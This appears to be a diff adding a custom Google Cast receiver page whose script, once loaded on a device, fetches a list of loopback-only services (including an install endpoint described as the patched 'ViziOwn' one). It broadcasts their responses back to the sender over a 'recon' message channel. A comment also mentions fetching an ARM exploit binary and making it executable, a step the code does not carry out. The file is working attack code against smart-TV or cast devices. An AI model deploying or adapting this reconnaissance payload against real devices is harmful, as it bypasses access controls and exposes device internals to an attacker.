@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head><script>
+window.__onGCastApiAvailable = function(loaded) {
+  if (!loaded) return;
+  
+  const ctx = cast.framework.CastReceiverContext.getInstance();
+  const bus = ctx.getCastMessageBus('urn:x-cast:recon');
+  
+  async function probe(url) {
+    try {
+      const r = await fetch(url);
+      const text = await r.text();
+      bus.broadcast(JSON.stringify({url, status: r.status, body: text.slice(0, 2000)}));
+    } catch(e) {
+      bus.broadcast(JSON.stringify({url, error: e.toString()}));
+    }
+  }
+
+  ctx.addEventListener(cast.framework.system.EventType.READY, async () => {
+    // Probe localhost services - these may have completely different
+    // access controls than the network-facing API
+    const targets = [
+      'http://127.0.0.1:7345/state/device/deviceinfo',
+      'http://127.0.0.1:7345/scpl/install',          // The patched ViziOwn endpoint
+      'http://127.0.0.1:7345/scpl/update/override_group',
+      'http://127.0.0.1:8012/',
+      'http://127.0.0.1:9223/json',
+      'http://127.0.0.1:9000/state/device/deviceinfo',
+      'http://127.0.0.1:10101/',
+      // Internal services that may only be bound to loopback
+      'http://127.0.0.1:80/',
+      'http://127.0.0.1:8080/',
+      'http://127.0.0.1:3000/',
+      'http://127.0.0.1:5000/',
+    ];
+    
+    for (const url of targets) await probe(url);
+    
+    // Also try fetching your ARM exploit binary
+    // and writing it somewhere executable
+    bus.broadcast(JSON.stringify({status: 'probe complete'}));
+  });
+
+  ctx.start();
+};
+</script>
+<script src="//www.gstatic.com/cast/sdk/libs/caf_receiver/v3/cast_receiver_framework.js"></script>
+</head>
+<body></body>
+</html>
